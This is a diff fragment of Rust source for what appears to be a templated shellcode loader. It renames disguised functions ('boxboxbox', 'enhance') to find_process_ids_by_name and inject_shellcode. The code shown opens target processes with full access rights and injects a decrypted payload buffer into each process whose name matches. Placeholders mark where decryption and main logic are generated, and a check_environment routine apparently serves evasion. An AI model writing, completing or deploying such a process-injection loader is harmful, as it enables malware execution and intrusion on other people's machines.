@@ -22,7 +22,7 @@ use std::thread;
 
 {{DECRYPTION_FUNCTION}}
 
-fn boxboxbox(tar: &str) -> Vec<usize> {
+fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     let tar_lower = tar.to_lowercase();
@@ -45,7 +45,7 @@ fn check_environment() -> bool {
 }
 
 
-fn enhance(mut buf: Vec<u8>, tar: usize) {
+fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
     unsafe {
         let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32) {
             Ok(h) => h,
@@ -106,10 +106,10 @@ fn main() {
 
     {{MAIN}}
 
-    let list: Vec<usize> = boxboxbox(&tar);
+    let list: Vec<usize> = find_process_ids_by_name(&tar);
     if !list.is_empty() {
         for i in &list {
-            enhance(vec.clone(), *i);
+            inject_shellcode(vec.clone(), *i);
         }
     }
 }
